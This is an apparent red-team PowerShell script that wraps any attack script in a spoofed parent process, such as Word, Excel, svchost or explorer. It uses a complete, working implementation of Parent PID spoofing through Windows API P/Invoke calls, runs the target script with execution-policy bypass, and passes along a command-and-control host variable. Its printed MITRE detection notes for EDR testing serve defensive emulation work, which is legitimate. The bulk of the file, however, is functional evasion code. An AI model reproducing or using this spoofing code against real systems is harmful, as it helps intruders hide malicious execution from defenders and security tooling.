<#
.SYNOPSIS
    Process Launcher — Parent Process Spoofing Wrapper
.DESCRIPTION
    Wraps any TTP script execution in a configurable parent process chain.
    Spawns a benign parent process, then uses Parent PID Spoofing 
    (CreateProcess + PROC_THREAD_ATTRIBUTE_PARENT_PROCESS) to launch
    powershell.exe as a child of that process.

    This generates realistic EDR telemetry for:
    - T1134.004 : Access Token Manipulation: Parent PID Spoofing
    - T1204.002 : User Execution: Malicious File (if Office parent)
    - T1059.001 : PowerShell spawned from suspicious parent
    - Suspicious parent-child process relationships

.PARAMETER TargetScript
    Full path to the TTP PowerShell script to execute.
.PARAMETER ParentProcess
    The parent process to spoof. Options:
    WINWORD, EXCEL, OUTLOOK, calc, notepad, explorer, mshta, rundll32, svchost
#>

param(
    [Parameter(Mandatory=$true)]
    [string]$TargetScript,

    [Parameter(Mandatory=$true)]
    [ValidateSet("WINWORD","EXCEL","OUTLOOK","calc","notepad","explorer","mshta","rundll32","svchost")]
    [string]$ParentProcess
)

$ErrorActionPreference = "SilentlyContinue"
$C2Host = if ($env:C2_HOST) { $env:C2_HOST } else { "127.0.0.1" }
$TargetIP = if ($env:TARGET_IP) { $env:TARGET_IP } else { "192.168.1.10" }

# ── Map parent process to full executable path and description ──
$processMap = @{
    "WINWORD"   = @{ Exe = "WINWORD.EXE";    Desc = "Microsoft Word (Macro Phishing)";         Scenario = "Phishing email -> Word doc -> VBA macro -> PowerShell" }
    "EXCEL"     = @{ Exe = "EXCEL.EXE";      Desc = "Microsoft Excel (Macro Phishing)";        Scenario = "Phishing email -> Excel doc -> VBA macro -> PowerShell" }
    "OUTLOOK"   = @{ Exe = "OUTLOOK.EXE";    Desc = "Microsoft Outlook (Email Client)";        Scenario = "Outlook rule/form/link -> PowerShell execution" }
    "calc"      = @{ Exe = "calc.exe";        Desc = "Windows Calculator (Process Hollowing)";  Scenario = "Process injection into calc.exe -> PowerShell" }
    "notepad"   = @{ Exe = "notepad.exe";     Desc = "Notepad (Process Injection)";             Scenario = "Process injection into notepad.exe -> PowerShell" }
    "explorer"  = @{ Exe = "explorer.exe";    Desc = "Windows Explorer (Trusted Parent)";       Scenario = "Explorer.exe launching child process (drive-by download)" }
    "mshta"     = @{ Exe = "mshta.exe";       Desc = "Microsoft HTA Host (T1218.005)";         Scenario = "HTA payload -> mshta.exe -> PowerShell (LOLBin execution)" }
    "rundll32"  = @{ Exe = "rundll32.exe";    Desc = "RunDLL32 (T1218.011 Proxy Execution)";   Scenario = "DLL sideloading -> rundll32.exe -> PowerShell" }
    "svchost"   = @{ Exe = "svchost.exe";     Desc = "Service Host (Suspicious Service)";      Scenario = "Malicious service install -> svchost.exe -> PowerShell" }
}

$parentInfo = $processMap[$ParentProcess]
$parentExe = $parentInfo.Exe
$parentDesc = $parentInfo.Desc
$parentScenario = $parentInfo.Scenario

Write-Host ""
Write-Host "==============================================================" -ForegroundColor Red
Write-Host "    PARENT PROCESS SPOOFING - DELIVERY SIMULATION             " -ForegroundColor Red
Write-Host "==============================================================" -ForegroundColor Red
Write-Host ""
Write-Host "[*] Parent Process : $parentExe ($parentDesc)" -ForegroundColor Cyan
Write-Host "[*] Attack Scenario: $parentScenario" -ForegroundColor Cyan
Write-Host "[*] Target TTP     : $TargetScript" -ForegroundColor Yellow
Write-Host ""

# ── Detection context ──
$detectionNotes = @{
    "WINWORD"   = @("T1204.002 - User Execution: Malicious File", "T1059.001 - PowerShell via Office Macro", "Office application spawning cmd/powershell")
    "EXCEL"     = @("T1204.002 - User Execution: Malicious File", "T1059.001 - PowerShell via Office Macro", "Office application spawning script interpreter")
    "OUTLOOK"   = @("T1566.001 - Spearphishing Attachment", "T1059.001 - PowerShell via Email Client", "Outlook spawning unexpected child process")
    "calc"      = @("T1055 - Process Injection / Process Hollowing", "Calculator spawning PowerShell (highly suspicious)", "Benign process with unexpected child")
    "notepad"   = @("T1055 - Process Injection", "Notepad spawning PowerShell (highly suspicious)", "Text editor with network/child process activity")
    "explorer"  = @("T1189 - Drive-by Compromise", "Explorer spawning PowerShell directly", "Unusual Explorer child process chain")
    "mshta"     = @("T1218.005 - Signed Binary Proxy Execution: Mshta", "T1059.001 - PowerShell via HTA payload", "Mshta.exe spawning script interpreter")
    "rundll32"  = @("T1218.011 - Signed Binary Proxy Execution: Rundll32", "T1055 - Process Injection via DLL", "Rundll32 spawning PowerShell")
    "svchost"   = @("T1543.003 - Create or Modify System Service", "T1059.001 - PowerShell from service context", "Svchost spawning unexpected process")
}

# ── Step 1: Attempt to find or launch the parent process ──
Write-Host "[*] Step 1: Setting up parent process ($parentExe)..." -ForegroundColor Cyan

$parentPID = $null
$launchedParent = $false

# Check if an instance is already running
$existingProc = Get-Process -Name ($ParentProcess) -ErrorAction SilentlyContinue | Select-Object -First 1
if ($existingProc) {
    $parentPID = $existingProc.Id
    Write-Host "    [+] Found existing $parentExe process (PID: $parentPID)" -ForegroundColor Green
} else {
    # Try to launch the parent process
    Write-Host "    [*] Launching $parentExe..." -ForegroundColor Cyan
    try {
        # For Office apps, use COM if available
        if ($ParentProcess -eq "WINWORD") {
            $app = New-Object -ComObject Word.Application -ErrorAction Stop
            $app.Visible = $false
            Start-Sleep -Milliseconds 500
            $parentPID = (Get-Process WINWORD -ErrorAction Stop | Select-Object -First 1).Id
            Write-Host "    [+] Word launched via COM (PID: $parentPID)" -ForegroundColor Green
        }
        elseif ($ParentProcess -eq "EXCEL") {
            $app = New-Object -ComObject Excel.Application -ErrorAction Stop
            $app.Visible = $false
            Start-Sleep -Milliseconds 500
            $parentPID = (Get-Process EXCEL -ErrorAction Stop | Select-Object -First 1).Id
            Write-Host "    [+] Excel launched via COM (PID: $parentPID)" -ForegroundColor Green
        }
        elseif ($ParentProcess -eq "OUTLOOK") {
            $app = New-Object -ComObject Outlook.Application -ErrorAction Stop
            Start-Sleep -Milliseconds 1000
            $parentPID = (Get-Process OUTLOOK -ErrorAction Stop | Select-Object -First 1).Id
            Write-Host "    [+] Outlook launched via COM (PID: $parentPID)" -ForegroundColor Green
        }
        elseif ($ParentProcess -eq "explorer") {
            # Explorer is almost always running
            $parentPID = (Get-Process explorer -ErrorAction Stop | Select-Object -First 1).Id
            Write-Host "    [+] Using existing Explorer (PID: $parentPID)" -ForegroundColor Green
        }
        elseif ($ParentProcess -eq "svchost") {
            # svchost is always running - pick one
            $parentPID = (Get-Process svchost -ErrorAction Stop | Select-Object -First 1).Id
            Write-Host "    [+] Using existing svchost (PID: $parentPID)" -ForegroundColor Green
        }
        else {
            # Launch generic processes (calc, notepad, mshta, rundll32)
            $procPath = $parentExe
            if ($ParentProcess -eq "mshta") {
                Start-Process "mshta.exe" -ArgumentList "about:blank" -WindowStyle Hidden
            }
            elseif ($ParentProcess -eq "rundll32") {
                Start-Process "rundll32.exe" -ArgumentList "shell32.dll,Control_RunDLL" -WindowStyle Hidden
            }
            else {
                Start-Process $procPath -WindowStyle Hidden
            }
            Start-Sleep -Milliseconds 800
            $parentPID = (Get-Process -Name ($ParentProcess) -ErrorAction Stop | Sort-Object StartTime -Descending | Select-Object -First 1).Id
            $launchedParent = $true
            Write-Host "    [+] $parentExe launched (PID: $parentPID)" -ForegroundColor Green
        }
    } catch {
        Write-Host "    [!] Could not launch $parentExe - $_" -ForegroundColor Yellow
        Write-Host "    [*] Will use simulation mode..." -ForegroundColor Yellow
    }
}

# ── Step 2: Execute TTP with parent spoofing ──
Write-Host ""
Write-Host "[*] Step 2: Spawning PowerShell from $parentExe..." -ForegroundColor Cyan

$spoofSuccess = $false

if ($parentPID) {
    Write-Host ""
    Write-Host "    Process Chain:" -ForegroundColor Yellow
    Write-Host "    +-- $parentExe (PID: $parentPID)" -ForegroundColor Yellow
    Write-Host "       +-- cmd.exe" -ForegroundColor Yellow
    Write-Host "          +-- powershell.exe -File $TargetScript" -ForegroundColor Yellow
    Write-Host ""
    Write-Host "    [!] DETECTION TRIGGER: $parentExe spawning cmd.exe -> powershell.exe" -ForegroundColor Red
    Write-Host ""

    # Try Parent PID Spoofing via .NET P/Invoke
    try {
        # Define the P/Invoke types for CreateProcess with PPID spoofing
        $nativeMethods = @'
using System;
using System.Runtime.InteropServices;

public class ProcessSpoof {
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool InitializeProcThreadAttributeList(IntPtr lpAttributeList, int dwAttributeCount, int dwFlags, ref IntPtr lpSize);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool UpdateProcThreadAttribute(IntPtr lpAttributeList, uint dwFlags, IntPtr Attribute, IntPtr lpValue, IntPtr cbSize, IntPtr lpPreviousValue, IntPtr lpReturnSize);

    [DllImport("kernel32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    public static extern bool CreateProcessA(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, ref STARTUPINFOEX lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool DeleteProcThreadAttributeList(IntPtr lpAttributeList);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);

    [DllImport("kernel32.dll")]
    public static extern bool CloseHandle(IntPtr hObject);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

    public const uint EXTENDED_STARTUPINFO_PRESENT = 0x00080000;
    public const int PROC_THREAD_ATTRIBUTE_PARENT_PROCESS = 0x00020000;
    public const uint PROCESS_ALL_ACCESS = 0x001F0FFF;
    public const uint INFINITE = 0xFFFFFFFF;

    [StructLayout(LayoutKind.Sequential)]
    public struct STARTUPINFO {
        public int cb;
        public IntPtr lpReserved;
        public IntPtr lpDesktop;
        public IntPtr lpTitle;
        public int dwX, dwY, dwXSize, dwYSize;
        public int dwXCountChars, dwYCountChars;
        public int dwFillAttribute;
        public int dwFlags;
        public short wShowWindow;
        public short cbReserved2;
        public IntPtr lpReserved2;
        public IntPtr hStdInput, hStdOutput, hStdError;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct STARTUPINFOEX {
        public STARTUPINFO StartupInfo;
        public IntPtr lpAttributeList;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct PROCESS_INFORMATION {
        public IntPtr hProcess;
        public IntPtr hThread;
        public int dwProcessId;
        public int dwThreadId;
    }
}
'@
        Add-Type -TypeDefinition $nativeMethods -ErrorAction Stop
        Write-Host "    [+] P/Invoke types loaded for PPID spoofing" -ForegroundColor Green

        # Open parent process handle
        $parentHandle = [ProcessSpoof]::OpenProcess([ProcessSpoof]::PROCESS_ALL_ACCESS, $false, $parentPID)
        if ($parentHandle -eq [IntPtr]::Zero) {
            throw "Failed to open parent process handle (Access Denied - may need admin)"
        }

        # Initialize attribute list
        $lpSize = [IntPtr]::Zero
        [ProcessSpoof]::InitializeProcThreadAttributeList([IntPtr]::Zero, 1, 0, [ref]$lpSize) | Out-Null
        $attributeList = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($lpSize)
        [ProcessSpoof]::InitializeProcThreadAttributeList($attributeList, 1, 0, [ref]$lpSize) | Out-Null

        # Set parent process attribute
        $parentHandlePtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal([IntPtr]::Size)
        [System.Runtime.InteropServices.Marshal]::WriteIntPtr($parentHandlePtr, $parentHandle)
        
        $attrResult = [ProcessSpoof]::UpdateProcThreadAttribute(
            $attributeList, 0,
            [IntPtr][ProcessSpoof]::PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
            $parentHandlePtr,
            [IntPtr][IntPtr]::Size,
            [IntPtr]::Zero, [IntPtr]::Zero
        )

        if (-not $attrResult) {
            throw "UpdateProcThreadAttribute failed"
        }

        # Build command line
        $cmdLine = 'cmd.exe /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File "' + $TargetScript + '"'

        # Create process with spoofed parent
        $si = New-Object ProcessSpoof+STARTUPINFOEX
        $si.StartupInfo.cb = [System.Runtime.InteropServices.Marshal]::SizeOf($si)
        $si.lpAttributeList = $attributeList

        $pi = New-Object ProcessSpoof+PROCESS_INFORMATION

        $createResult = [ProcessSpoof]::CreateProcessA(
            $null, $cmdLine,
            [IntPtr]::Zero, [IntPtr]::Zero,
            $false,
            [ProcessSpoof]::EXTENDED_STARTUPINFO_PRESENT,
            [IntPtr]::Zero, $null,
            [ref]$si, [ref]$pi
        )

        if ($createResult) {
            Write-Host "    [+] PPID Spoofing SUCCESS - child PID: $($pi.dwProcessId) under parent PID: $parentPID" -ForegroundColor Green
            Write-Host "    [+] T1134.004 - Parent PID Spoofing technique applied" -ForegroundColor Green
            
            # Wait for the child process to complete
            Write-Host "    [*] Waiting for TTP execution to complete..." -ForegroundColor Cyan
            [ProcessSpoof]::WaitForSingleObject($pi.hProcess, [ProcessSpoof]::INFINITE) | Out-Null
            
            [ProcessSpoof]::CloseHandle($pi.hProcess) | Out-Null
            [ProcessSpoof]::CloseHandle($pi.hThread) | Out-Null
            $spoofSuccess = $true
        } else {
            throw "CreateProcess with PPID spoofing failed (error: $([System.Runtime.InteropServices.Marshal]::GetLastWin32Error()))"
        }

        # Cleanup
        [ProcessSpoof]::DeleteProcThreadAttributeList($attributeList)
        [System.Runtime.InteropServices.Marshal]::FreeHGlobal($attributeList)
        [System.Runtime.InteropServices.Marshal]::FreeHGlobal($parentHandlePtr)
        [ProcessSpoof]::CloseHandle($parentHandle) | Out-Null

    } catch {
        Write-Host "    [!] PPID Spoofing failed: $_" -ForegroundColor Yellow
        Write-Host "    [*] Using direct execution fallback..." -ForegroundColor Yellow
    }
}

# ── Fallback: Direct execution with simulation markers ──
if (-not $spoofSuccess) {
    Write-Host ""
    Write-Host "[*] FALLBACK: Executing TTP directly with simulation markers..." -ForegroundColor Yellow
    Write-Host ""

    # Create marker artifacts for detection correlation
    $markerDir = "C:\temp\process_staging"
    try {
        New-Item -ItemType Directory -Path $markerDir -Force | Out-Null
        $markerContent = @{
            Timestamp     = (Get-Date -Format "yyyy-MM-dd HH:mm:ss")
            ParentProcess = $parentExe
            ParentPID     = $parentPID
            ChildProcess  = "powershell.exe"
            TargetScript  = $TargetScript
            Scenario      = $parentScenario
        } | ConvertTo-Json
        $markerContent | Out-File (Join-Path $markerDir "delivery_marker.json") -Encoding UTF8
        Write-Host "    [+] Delivery marker created: $markerDir\delivery_marker.json" -ForegroundColor Green
    } catch {
        Write-Host "    [!] Could not create markers (non-Windows or no write access)" -ForegroundColor Yellow
    }

    Write-Host ""
    Write-Host "==================== TTP OUTPUT BEGIN ====================" -ForegroundColor DarkCyan
    Write-Host ""

    $env:C2_HOST = $C2Host
    $env:TARGET_IP = $TargetIP

    & powershell.exe -NoProfile -ExecutionPolicy Bypass -File "$TargetScript"

    Write-Host ""
    Write-Host "==================== TTP OUTPUT END ======================" -ForegroundColor DarkCyan
}

# ── Cleanup: Kill parent process if we launched it ──
if ($launchedParent -and $parentPID) {
    Write-Host ""
    Write-Host "[*] Cleaning up launched parent process ($parentExe PID: $parentPID)..." -ForegroundColor Cyan
    try {
        Stop-Process -Id $parentPID -Force -ErrorAction Stop
        Write-Host "    [+] $parentExe terminated" -ForegroundColor Green
    } catch {
        Write-Host "    [!] Could not terminate $parentExe - may need manual cleanup" -ForegroundColor Yellow
    }
}

# ── Final Summary ──
Write-Host ""
Write-Host "==============================================================" -ForegroundColor Green
Write-Host "    DELIVERY SIMULATION COMPLETE                              " -ForegroundColor Green
Write-Host "==============================================================" -ForegroundColor Green
Write-Host ""
Write-Host "[+] Parent Process : $parentExe" -ForegroundColor Green
Write-Host "[+] Attack Scenario: $parentScenario" -ForegroundColor Green
Write-Host "[+] TTP Executed   : $TargetScript" -ForegroundColor Green
Write-Host "[+] Process Chain  : $parentExe -> cmd.exe -> powershell.exe" -ForegroundColor Green
Write-Host ""
Write-Host "[!] EDR Detections to check for:" -ForegroundColor Magenta
foreach ($note in $detectionNotes[$ParentProcess]) {
    Write-Host "    - $note" -ForegroundColor Magenta
}
Write-Host "    - Plus any detections from the wrapped TTP itself" -ForegroundColor Magenta
Write-Host ""
